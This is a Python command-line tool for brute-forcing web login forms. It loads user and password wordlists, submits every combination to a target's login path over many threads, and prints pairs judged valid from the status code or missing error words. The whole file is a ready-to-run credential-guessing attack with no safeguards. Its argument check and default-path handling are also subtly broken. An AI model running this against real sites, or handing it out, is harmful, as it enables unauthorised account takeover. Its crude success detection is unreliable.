#!/usr/bin/env python3
"""
Simple HTTP Brute Forcer
Usage: python bruteforce.py target.com /login users.txt passwords.txt
"""

import sys
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

class HTTPBruteforcer:
    def __init__(self, target, path=None, username_field='username', password_field='password'):
        self.target = target
        self.path = path or '/login'
        self.username_field = username_field
        self.password_field = password_field
        self.url = target.rstrip('/') + path
        
    def test_credentials(self, username, password):
        """Test a single set of credentials"""
        data = {
            self.username_field: username,
            self.password_field: password
        }
        
        try:
            r = requests.post(self.url, data=data, timeout=10, allow_redirects=False)
            
            # Check for success indicators
            if r.status_code in [200, 302]:
                # Check response for success
                if 'incorrect' not in r.text.lower() and 'invalid' not in r.text.lower():
                    return {'username': username, 'password': password, 'status': r.status_code}
            
            # Check for different status codes
            if r.status_code == 302 and 'location' in r.headers:
                return {'username': username, 'password': password, 'status': 'redirect'}
                
        except Exception as e:
            pass
        
        return None
    
    def bruteforce(self, users, passwords, threads=10):
        """Brute force with wordlists"""
        print(f"[*] Brute forcing {self.url}")
        
        found = []
        total = len(users) * len(passwords)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {}
            for user in users:
                for password in passwords:
                    future = executor.submit(self.test_credentials, user.rstrip(), password.rstrip())
                    futures[future] = (user, password)
            
            done = 0
            for future in as_completed(futures):
                done += 1
                if done % 10 == 0:
                    print(f"[*] Progress: {done}/{total}")
                
                result = future.result()
                if result:
                    print(f"[!] FOUND: {result['username']}:{result['password']}")
                    found.append(result)
        
        return found


def main():
    if len(sys.argv) < 4:
        print("Usage: python bruteforce.py <target> <path> <users_file> <passwords_file>")
        print("Example: python bruteforce.py https://example.com /login users.txt passwords.txt")
        sys.exit(1)
    
    target = sys.argv[1]
    path = sys.argv[2]
    users_file = sys.argv[3]
    passwords_file = sys.argv[4]
    
    # Load wordlists
    with open(users_file) as f:
        users = [line.strip() for line in f if line.strip()]
    
    with open(passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Loaded {len(users)} users and {len(passwords)} passwords")
    
    bruteforcer = HTTPBruteforcer(target, path)
    results = bruteforcer.bruteforce(users, passwords)
    
    if results:
        print(f"\n[+] Found {len(results)} valid credentials:")
        for r in results:
            print(f"    {r['username']}:{r['password']}")
    else:
        print("\n[*] No credentials found")


if __name__ == "__main__":
    main()